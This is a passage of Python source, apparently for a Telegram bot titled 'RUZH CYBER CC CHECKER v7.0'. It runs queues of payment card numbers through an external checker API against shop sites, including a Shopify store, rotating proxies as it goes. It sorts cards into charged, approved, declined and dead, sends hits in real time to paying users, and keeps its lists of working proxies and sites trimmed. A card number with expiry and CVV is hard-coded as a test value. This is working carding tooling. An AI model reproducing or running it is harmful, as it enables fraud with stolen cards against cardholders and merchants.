async def worker():
            while not queue.empty() and session_key in active_sessions:
                state = active_sessions.get(session_key)
                if not state:
                    break
                while state.get('paused', False):
                    await asyncio.sleep(1)
                    state = active_sessions.get(session_key)
                    if not state:
                        return

                try:
                    card = queue.get_nowait()
                except:
                    break

                sites = load_sites()
                proxies = load_proxies()
                if not sites or not proxies:
                    break

                res = await check_card_with_retry(card, sites, proxies, max_retries=1)
                results['checked'] += 1

                if res['status'] == 'Charged':
                    results['approved'].append(res)
                    await send_realtime_hit(user_id, res, 'Charged', 'ruzh')
                elif res['status'] == 'Approved':
                    results['approved'].append(res)
                    await send_realtime_hit(user_id, res, 'Approved', 'ruzh')
                elif res['status'] == 'Declined':
                    results['declined'].append(res)
                else:
                    results['dead'].append(res)

                queue.task_done()

                now = time.time()
                if now - last_update[0] >= 1.0:
                    last_update[0] = now
                    if session_key in active_sessions:
                        try:
                            await update_progress(user_id, status_msg.id, results, results['checked'])
                        except:
                            pass

        workers = [asyncio.create_task(worker()) for _ in range(10)]

        while workers:
            if session_key not in active_sessions:
                for w in workers:
                    if not w.done():
                        w.cancel()
                break
            done, pending = await asyncio.wait(workers, timeout=1.0)
            workers = list(pending)

        if session_key in active_sessions:
            await update_progress(user_id, status_msg.id, results, results['checked'])

    except Exception as e:
        await bot.send_message(user_id, premium_emoji(f"❌ Error: {e}"))

    finally:
        if session_key in active_sessions:
            del active_sessions[session_key]
        try:
            await status_msg.delete()
        except:
            pass
        await send_final_results(user_id, results)

# ─── PROXY COMMANDS ───

@bot.on(events.NewMessage(pattern='/proxy'))
async def proxy_command(event):
    user_id = event.sender_id
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Access Denied."))
        return

    proxies = load_proxies()
    if not proxies:
        await event.reply(premium_emoji("❌ No proxies."))
        return

    status_msg = await event.reply(premium_emoji(f"🔥 Checking {len(proxies)} proxies..."))
    alive, dead = [], []

    for i in range(0, len(proxies), 50):
        batch = proxies[i:i+50]
        results = await asyncio.gather(*[test_proxy(p) for p in batch])
        for r in results:
            (alive if r['status'] == 'alive' else dead).append(r['proxy'])
        await status_msg.edit(premium_emoji(f"🔥 Checked: {len(alive)+len(dead)}/{len(proxies)}\nAlive: {len(alive)}\nDead: {len(dead)}"), parse_mode='html')

    async with aiofiles.open(PROXY_FILE, 'w') as f:
        for p in alive:
            await f.write(f"{p}\n")

    await status_msg.edit(premium_emoji(f"✅ Done! Alive: {len(alive)}, Removed: {len(dead)}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/fuck'))
async def site_command(event):
    user_id = event.sender_id
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Access Denied."))
        return

    sites = load_sites()
    proxies = load_proxies()
    if not sites or not proxies:
        await event.reply(premium_emoji("❌ No sites or proxies."))
        return

    status_msg = await event.reply(premium_emoji(f"🔥 Checking {len(sites)} sites..."))
    alive, dead = [], []

    for i in range(0, len(sites), 10):
        batch = sites[i:i+10]
        fresh_proxies = load_proxies()
        results = await asyncio.gather(*[test_site(s, random.choice(fresh_proxies)) for s in batch])
        for r in results:
            (alive if r['status'] == 'alive' else dead).append(r['site'])
        await status_msg.edit(premium_emoji(f"🔥 Checked: {len(alive)+len(dead)}/{len(sites)}\nAlive: {len(alive)}\nDead: {len(dead)}"), parse_mode='html')

    async with aiofiles.open(SITES_FILE, 'w') as f:
        for s in alive:
            await f.write(f"{s}\n")

    await status_msg.edit(premium_emoji(f"✅ Done! Alive: {len(alive)}, Removed: {len(dead)}"), parse_mode='html')

# ─── TEST FUNCTIONS ───

async def test_site(site, proxy):
    test_card = "5154623245618097|03|2032|156"
    try:
        params = {'cc': test_card, 'url': site, 'proxy': proxy}
        timeout = aiohttp.ClientTimeout(total=60)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(CHECKER_API_URL, params=params) as resp:
                raw = await resp.json(content_type=None)
        response_msg = raw.get('Response', '').lower()
        if is_dead_site_error(response_msg):
            return {'site': site, 'status': 'dead'}
        return {'site': site, 'status': 'alive'}
    except:
        return {'site': site, 'status': 'dead'}

async def test_proxy(proxy):
    test_card = "5154623245618097|03|2032|156"
    test_site = "https://riverbendhomedev.myshopify.com"
    try:
        params = {'cc': test_card, 'url': test_site, 'proxy': proxy}
        timeout = aiohttp.ClientTimeout(total=60)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(CHECKER_API_URL, params=params) as resp:
                raw = await resp.json(content_type=None)
        response_msg = raw.get('Response', '').lower()
        if 'proxy dead' in response_msg or 'invalid proxy format' in response_msg or 'no proxy' in response_msg:
            return {'proxy': proxy, 'status': 'dead'}
        return {'proxy': proxy, 'status': 'alive'}
    except:
        return {'proxy': proxy, 'status': 'dead'}

# ─── CALLBACKS ───

@bot.on(events.CallbackQuery(pattern=b"pause"))
async def pause_handler(event):
    session_key = f"{event.sender_id}_{event.message_id}"
    if session_key in active_sessions:
        active_sessions[session_key]['paused'] = True
        await event.answer("⏸️ Paused")

@bot.on(events.CallbackQuery(pattern=b"resume"))
async def resume_handler(event):
    session_key = f"{event.sender_id}_{event.message_id}"
    if session_key in active_sessions:
        active_sessions[session_key]['paused'] = False
        await event.answer("▶️ Resumed")

@bot.on(events.CallbackQuery(pattern=b"stop"))
async def stop_handler(event):
    session_key = f"{event.sender_id}_{event.message_id}"
    if session_key in active_sessions:
        del active_sessions[session_key]
        await event.answer("🛑 Stopped")
        await event.edit(premium_emoji("🛑 Stopped by user."))

# ─── RUN ───

print("✅ RUZH CYBER BOT STARTED")
print("⚡ Bot: RUZH CYBER CC CHECKER v7.0")
bot.run_until_disconnected()
